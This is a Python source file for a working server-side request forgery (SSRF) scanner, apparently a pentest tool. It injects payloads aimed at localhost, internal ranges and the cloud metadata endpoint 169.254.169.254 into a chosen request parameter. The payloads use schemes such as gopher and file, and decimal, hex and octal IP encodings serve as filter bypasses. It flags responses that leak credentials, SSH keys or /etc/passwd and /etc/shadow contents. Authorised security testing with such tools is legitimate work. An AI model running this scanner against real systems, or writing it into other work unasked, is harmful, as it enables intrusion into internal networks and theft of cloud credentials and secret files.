import requests
import urllib.parse
import json
import time
import os
import ipaddress
import re
import difflib
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings()

CONFIG_FILE = "config.json"

SIGNATURES = {
    "CLOUD_METADATA": [
        "latest/meta-data/", "instance-id", "ami-id", "role-name",
        "computeMetadata/v1", "workload-identity", "managed-identity",
        "identity/oauth2/token", "x-google-metadata-request",
        "microsoft.compute/virtualmachines"
    ],
    "SENSITIVE_FILES": [
        "root:x:0:0:", "boot.ini", "[boot loader]", "conf/server.xml",
        "/.dockerenv", "database_user", "aws_access_key_id", "var/www/html",
        "id_rsa", "id_dsa", ".ssh/known_hosts", "config/database.yml",
        "web.config", "php.ini", "htaccess", "etc/shadow"
    ],
    "SERVICE_BANNERS": [
        "redis_version:", "mysql_server_prepare", "postgresql", 
        "mongodb", "memcached", "version: kibana", "elastic_cluster",
        "amqp:connection", "openssh", "rsync", "git-upload-pack",
        "hudson.model.hudson", "jetty/", "werkzeug/", "RabbitMQ"
    ]
}

COMMON_PORTS = [80,23,443,21,22,25,3389,110,445,139,143,53,135,3306,8080]
PROTOS = ["http", "https", "gopher", "ftp", "ssh", "ldap", "smb", "dict", "file"]

flags = {
    "check_domains": True, "check_ips": True, "check_local": True,
    "scan_ports": False, "scan_protos": False, "autostop": False,
    "bypass_ip": False, "threads": 5, "timeout": 1,
    "custom_range": ""
}

REDIRECT_LINK = ""

def save_config():
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump({"flags": flags, "redirect": REDIRECT_LINK}, f, indent=4)
    except Exception as e:
        print(f"[-] Error saving config: {e}")

def load_config():
    global REDIRECT_LINK
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                flags.update(data.get("flags", {}))
                REDIRECT_LINK = data.get("redirect", "")
                print("[+] Settings loaded from config.json")
        except Exception as e:
            print(f"[-] Error loading config: {e}")

load_config()

class ResponseAnalyzer:
    def __init__(self, baseline_responses):
        self.base_texts = [r.text for r in baseline_responses]
        self.base_codes = [r.status_code for r in baseline_responses]
        self.base_times = [r.elapsed.total_seconds() for r in baseline_responses]
        self.base_internal_status = self._extract_internal_status(baseline_responses[0])
        self.avg_time = sum(self.base_times) / len(self.base_times)
        self.time_threshold = max(self.avg_time * 3.5, 4.0)

    def _extract_internal_status(self, response):
        try:
            data = response.json()
            def find_val(obj, key):
                if isinstance(obj, dict):
                    if key in obj: return obj[key]
                    for v in obj.values():
                        res = find_val(v, key)
                        if res: return res
                elif isinstance(obj, list):
                    for item in obj:
                        res = find_val(item, key)
                        if res: return res
                return None
            for k in ['statusCode', 'status', 'code', 'resultCode']:
                val = find_val(data, k)
                if val: return str(val)
        except: pass
        return None

    def analyze(self, response):
        score, reasons = 0, []
        curr_time = response.elapsed.total_seconds()
        curr_text = response.text
        
        internal = self._extract_internal_status(response)
        if internal and internal != self.base_internal_status:
            score += 50
            reasons.append(f"JSON_CODE_{internal}")

        if curr_time > self.time_threshold:
            score += 45
            reasons.append(f"TIMEOUT({curr_time:.1f}s)")

        if response.status_code not in self.base_codes:
            score += 25
            reasons.append(f"HTTP_{response.status_code}")

        similarity = difflib.SequenceMatcher(None, self.base_texts[0], curr_text).ratio()
        if similarity < 0.70:
            score += 20
            reasons.append(f"DIFF({int((1-similarity)*100)}%)")

        text_lower = curr_text.lower()
        for cat, keys in SIGNATURES.items():
            if any(k in text_lower for k in keys):
                score += 100
                reasons.append(f"FOUND_{cat}")

        return {"vulnerable": score >= 40, "score": score, "reasons": reasons}

def generate_ip_bypasses(ip_str):
    bypasses = [ip_str]
    try:
        ip_obj = ipaddress.IPv4Address(ip_str)
        packed = int(ip_obj)
        bypasses.extend([str(packed), hex(packed)])
        parts = ip_str.split('.')
        if len(parts) == 4:
            bypasses.append(".".join([format(int(x), '04o') for x in parts]))
    except: pass
    return list(set(bypasses))

def parse_targets(input_str):
    try:
        input_str = input_str.strip()
        if not input_str: return []
        if "/" in input_str: return [str(ip) for ip in ipaddress.IPv4Network(input_str, False)]
        return [input_str]
    except: return []

def build_payloads():
    raw_t = []
    
    if flags["custom_range"]:
        print(f"[*] Using manual range: {flags['custom_range']}")
        raw_t.extend(parse_targets(flags["custom_range"]))
    else:
        if flags["check_domains"] and os.path.exists("domains.txt"):
            with open("domains.txt", "r", encoding="utf-8") as f:
                for line in f: raw_t.extend(parse_targets(line))
                
        if flags["check_ips"] and os.path.exists("ips.txt"):
            with open("ips.txt", "r", encoding="utf-8") as f:
                for line in f: raw_t.extend(parse_targets(line))

        if flags["check_local"]:
            raw_t.extend(["127.0.0.1", "localhost", "0.0.0.0", "169.254.169.254"])

    unique_targets = list(set(filter(None, raw_t)))
    
    if flags["bypass_ip"]:
        final_t = []
        for t in unique_targets:
            final_t.extend(generate_ip_bypasses(t))
        unique_targets = list(set(final_t))

    if not unique_targets:
        print("[!] Warning: No targets loaded. Defaulting to localhost.")
        if not flags["check_local"]: unique_targets = ["127.0.0.1"]

    active_protos = PROTOS if flags["scan_protos"] else ["http"]
    active_ports = COMMON_PORTS if flags["scan_ports"] else [None]
    
    return [f"{REDIRECT_LINK}{pr}://{t}" + (f":{po}" if po else "") 
            for t in unique_targets for pr in active_protos for po in active_ports]

def send_request(method, url, headers, body_raw, param, payload, mode):
    h = headers.copy()
    h.pop("Content-Length", None) 
    try:
        if method == "GET":
            u = urllib.parse.urlparse(url)
            p = dict(urllib.parse.parse_qsl(u.query))
            p[param] = payload
            f_url = u._replace(query=urllib.parse.urlencode(p)).geturl()
            return requests.get(f_url, headers=h, timeout=flags["timeout"], verify=False, allow_redirects=True)
        
        if mode == "json":
            try: data = json.loads(body_raw)
            except: return None 
            data[param] = payload
            return requests.post(url, headers=h, json=data, timeout=flags["timeout"], verify=False)
        else:
            data = dict(urllib.parse.parse_qsl(body_raw))
            data[param] = payload
            return requests.post(url, headers=h, data=data, timeout=flags["timeout"], verify=False)
    except Exception as e:
        return str(e)

def menu():
    global REDIRECT_LINK
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""\033[94m
 ███████╗███████╗███████╗██████╗ ███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
 ██╔════╝██╔════╝██╔════╝██╔══██╗██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
 ███████╗███████╗███████╗██████╔╝█████╗      ███████╗██║     ███████║██╔██╗ ██║
 ╚════██║╚════██║╚════██║██╔══██╗██╔══╝      ╚════██║██║     ██╔══██║██║╚██╗██║
 ███████║███████║███████║██║  ██║██║         ███████║╚██████╗██║  ██║██║ ╚████║
 ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝         ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
\033[96m                       >>> by Cancahen <<< \033[0m""")
        
        print(" " + "="*65)
        print(f" \033[93m[TARGETING]\033[0m                    \033[93m[PAYLOADS & BYPASS]\033[0m")
        print(f"  1. Domains:     [{'ON' if flags['check_domains'] else 'OFF'}]      3. IP Bypass:     [{'ON' if flags['bypass_ip'] else 'OFF'}]")
        print(f"  2. IP Ranges:   [{'ON' if flags['check_ips'] else 'OFF'}]      4. Port Scanning: [{'ON' if flags['scan_ports'] else 'OFF'}]")
        print(f"  L. Local Host:  [{'ON' if flags['check_local'] else 'OFF'}]      5. Multi-Protos:  [{'ON' if flags['scan_protos'] else 'OFF'}]")
        print(f"  \033[95mI. Custom Range: [{flags['custom_range'] or 'None'}]\033[0m")
        
        print("\n " + "="*65)
        print(f" \033[93m[PERFORMANCE]\033[0m                  \033[93m[ADVANCED]\033[0m")
        print(f"  T. Threads:  [{flags['threads']}]             6. Auto-Stop:     [{'ON' if flags['autostop'] else 'OFF'}]")
        print(f"  O. Timeout:  [{flags['timeout']}s]            R. OOB/Redirect:  [{REDIRECT_LINK or 'Disabled'}]")
        
        print("\n " + "="*65)
        print("  \033[92m0. >>> EXECUTE SCAN <<<\033[0m")
        print("  Q. Save & Exit")
        print(" " + "="*65)
        
        c = input("\n\033[96m[sssrf_scan]>\033[0m ").lower()
        
        if c == '0': 
            save_config() 
            break
        elif c == 'q': 
            save_config()
            exit()
        elif c == 'i':
            flags['custom_range'] = input("[?] Enter range (e.g. 10.0.0.0/24): ").strip()
            save_config()
        elif c == '1': flags['check_domains'] = not flags['check_domains']; save_config()
        elif c == '2': flags['check_ips'] = not flags['check_ips']; save_config()
        elif c == 'l': flags['check_local'] = not flags['check_local']; save_config()
        elif c == '3': flags['bypass_ip'] = not flags['bypass_ip']; save_config()
        elif c == '4': flags['scan_ports'] = not flags['scan_ports']; save_config()
        elif c == '5': flags['scan_protos'] = not flags['scan_protos']; save_config()
        elif c == '6': flags['autostop'] = not flags['autostop']; save_config()
        elif c == 't': 
            try: 
                flags['threads'] = int(input("[?] New threads count: "))
                save_config()
            except: pass
        elif c == 'o': 
            try: 
                flags['timeout'] = int(input("[?] New timeout (seconds): "))
                save_config()
            except: pass
        elif c == 'r': 
            REDIRECT_LINK = input("[?] Enter OOB/Redirect URL: ")
            save_config()


def main():
    if not os.path.exists("request.txt"):
        print("[-] request.txt file not found!")
        return
    
    with open("request.txt", "r", encoding="utf-8") as f:
        content = f.read().replace("\r\n", "\n")
    
    parts = content.split("\n\n", 1)
    header_part = parts[0].strip()
    body = parts[1] if len(parts) > 1 else ""
    lines = header_part.split("\n")
    
    try: method, path = lines[0].split()[0], lines[0].split()[1]
    except: print("[-] Bad request format"); return

    headers = {l.split(":", 1)[0].strip(): l.split(":", 1)[1].strip() for l in lines[1:] if ":" in l}
    host = headers.get('Host')
    if not host: print("[-] Missing Host header"); return

    scheme = "https"
    url = f"{scheme}://{host}{path}"
    mode = "json" if "json" in headers.get("Content-Type", "").lower() else "form"
    
    params = {}
    if method == "GET": params = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(url).query))
    else:
        try: params = json.loads(body) if mode == "json" else dict(urllib.parse.parse_qsl(body))
        except: pass

    if not params: print("[-] No parameters found."); return
    
    print(f"[*] Target: {url}")
    print("[!] Parameters:")
    p_keys = list(params.keys())
    for i, k in enumerate(p_keys): print(f"  {i}. {k}")
    
    try: idx = int(input("[>] Choose parameter number: "))
    except: idx = 0
    inject_param = p_keys[idx]

    menu()

    print(f"[*] Calibrating ({url})...")
    baselines = []
    r = send_request(method, url, headers, body, inject_param, params[inject_param], mode)
    
    if isinstance(r, str) or r is None:
        new_scheme = "https" if scheme == "http" else "http"
        url = f"{new_scheme}://{host}{path}"
        r = send_request(method, url, headers, body, inject_param, params[inject_param], mode)
        if isinstance(r, str) or r is None:
            print("[-] TARGET DOWN."); return
        baselines.append(r)
    else:
        baselines.append(r)

    time.sleep(0.5)
    r2 = send_request(method, url, headers, body, inject_param, params[inject_param], mode)
    if isinstance(r2, requests.Response): baselines.append(r2)

    analyzer = ResponseAnalyzer(baselines)
    payloads = build_payloads()
    print(f"[*] Starting: {len(payloads)} payloads\n")

    with ThreadPoolExecutor(max_workers=flags["threads"]) as executor:
        tasks = {executor.submit(send_request, method, url, headers, body, inject_param, p, mode): p for p in payloads}
        for task in as_completed(tasks):
            p = tasks[task]
            r = task.result()
            
            if isinstance(r, requests.Response):
                res = analyzer.analyze(r)
                
                color = "\033[0m"
                if res["vulnerable"]:
                    color = "\033[92m"
                elif res["score"] > 0:
                    color = "\033[93m"
                
                reasons_str = " | ".join(res['reasons']) if res['reasons'] else "NORMAL"
                out = f"{color}[{r.status_code}] Score: {res['score']:<3} | {p:<40} -> {reasons_str}\033[0m"
                
                print(out)
                
                if res["score"] > 0:
                    with open("found.log", "a") as f:
                        f.write(f"[{r.status_code}] Score: {res['score']} | {p} -> {reasons_str}\n")
            
            elif isinstance(r, str):
                print(f"\033[90m[ERROR]  {p:<40} -> {r}\033[0m")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: 
        save_config()
        print("\n[!] Stopped by user.")